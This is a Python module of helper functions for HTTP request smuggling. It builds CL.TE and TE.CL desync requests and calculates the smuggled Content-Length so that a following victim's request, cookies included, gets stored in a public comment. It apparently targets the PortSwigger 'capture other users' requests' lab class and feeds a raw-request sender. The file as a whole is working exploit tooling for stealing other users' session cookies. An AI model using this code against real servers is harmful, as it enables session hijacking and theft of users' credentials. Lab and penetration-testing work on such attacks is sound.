"""CL.TE capture-request smuggling: build the byte-exact smuggle and size the
smuggled Content-Length from a sample of the victim's request.

The "capture other users' requests" class (PortSwigger) desyncs a front-end
that honours Content-Length against a back-end that honours Transfer-Encoding,
so a smuggled POST /post/comment with an oversized Content-Length swallows the
next user's request into a stored comment. Two things are fiddly and were, in
practice, done by hand:

  1. The OUTER request's Content-Length must equal the length of the chunk
     terminator plus the whole smuggled request, or the front-end waits for
     more bytes (hang) or truncates the smuggle.
  2. The SMUGGLED Content-Length must reach the target header (the victim's
     Cookie) yet not exceed the victim request's total length — too small and
     the captured comment truncates before the cookie; too large and the
     back-end waits forever for bytes the victim never sends (timeout).

These helpers compute both from data instead of a blind Content-Length search.
Pure functions — no Burp round-trip; feed the result to send_raw_request with
http_version="direct".
"""

CRLF = "\r\n"


def wrap_clte(host: str, smuggled_request: str, path: str = "/") -> str:
    """Wrap a smuggled HTTP/1.1 request in a CL.TE outer request.

    The outer request carries Content-Length = len("0\\r\\n\\r\\n" +
    smuggled_request) and Transfer-Encoding: chunked. A front-end that honours
    Content-Length forwards exactly those bytes; a back-end that honours
    Transfer-Encoding sees the terminating 0-chunk end the first request and
    treats the smuggled bytes as the start of the next. Returns the complete
    raw request (LF endings; send_raw_request normalises to CRLF, and the
    Content-Length here is counted on the CRLF form so it matches the wire).
    """
    outer_body = "0" + CRLF + CRLF + smuggled_request
    outer_cl = len(outer_body.encode())
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + f"Content-Length: {outer_cl}" + CRLF
        + "Transfer-Encoding: chunked" + CRLF
        + CRLF
        + outer_body
    )


def wrap_tecl(host: str, smuggled_request: str, path: str = "/") -> str:
    """Wrap a smuggled HTTP/1.1 request in a TE.CL outer request.

    Mirror of wrap_clte for the opposite desync: a front-end that honours
    Transfer-Encoding against a back-end that honours Content-Length. The body
    is a single chunk holding the smuggled request, terminated by a 0-chunk. The
    front-end (TE) reads the whole chunk and forwards it; the back-end (CL)
    consumes only the chunk-size line as the first request's body and parses the
    smuggled bytes as the next request. The outer Content-Length is set to the
    byte length of that chunk-size line (hex + CRLF) so the back-end stops
    exactly there — computed here, because a >255-byte smuggle needs a 3-hex-digit
    size line and thus Content-Length 5, not the 4 that a hand-written 2-digit
    template assumes.

    The smuggled request must carry its OWN Content-Length large enough to absorb
    the trailing "0" chunk (and the head of the next real request) so the back-end
    does not error — that is the caller's payload, not this wrapper's job.
    """
    chunk_hex = format(len(smuggled_request.encode()), "x")
    size_line = chunk_hex + CRLF
    outer_cl = len(size_line.encode())
    body = size_line + smuggled_request + CRLF + "0" + CRLF + CRLF
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + f"Content-Length: {outer_cl}" + CRLF
        + "Transfer-Encoding: chunked" + CRLF
        + CRLF
        + body
    )


def capture_cl_through(sample_request: str, prefix_len: int,
                       capture_through: str = "cookie") -> dict:
    """Recommend the smuggled Content-Length so the stored capture reaches the
    END of the ``capture_through`` header line in a sample of the victim's
    request.

    The smuggled comment body up to the reflected field (e.g.
    ``csrf=...&website=&comment=``) is ``prefix_len`` bytes; the victim's
    request is appended to it, so the comment holds ``prefix_len + D`` bytes
    once ``D`` bytes of the victim have arrived. To store the victim through
    the end of a header line at depth ``D``, set the smuggled Content-Length to
    ``prefix_len + D``.

    Args:
        sample_request: A captured (even truncated) copy of the victim request,
            with real CRLF or LF line breaks.
        prefix_len: Byte length of the smuggled comment body before the victim
            is appended (the part ending in ``...&comment=``).
        capture_through: Header name whose line must be fully captured
            (default ``cookie`` — the class's target).

    Returns:
        dict with ``content_length`` (recommended smuggled Content-Length),
        ``capture_depth`` (bytes of the victim captured), and ``found``
        (False when ``capture_through`` is absent from the sample — the
        content_length is then only a floor; capture a deeper sample first).
        When found, the caller should still expect the victim to SELF-complete
        only if content_length <= prefix_len + victim_total; since the cookie
        is usually the last header, that means content_length ~= this value.
    """
    idx = sample_request.lower().find(capture_through.lower())
    if idx < 0:
        depth = len(sample_request.encode())
        return {"content_length": prefix_len + depth,
                "capture_depth": depth, "found": False}
    nl = sample_request.find("\n", idx)
    end = nl + 1 if nl >= 0 else len(sample_request)
    depth = len(sample_request[:end].encode())
    return {"content_length": prefix_len + depth,
            "capture_depth": depth, "found": True}
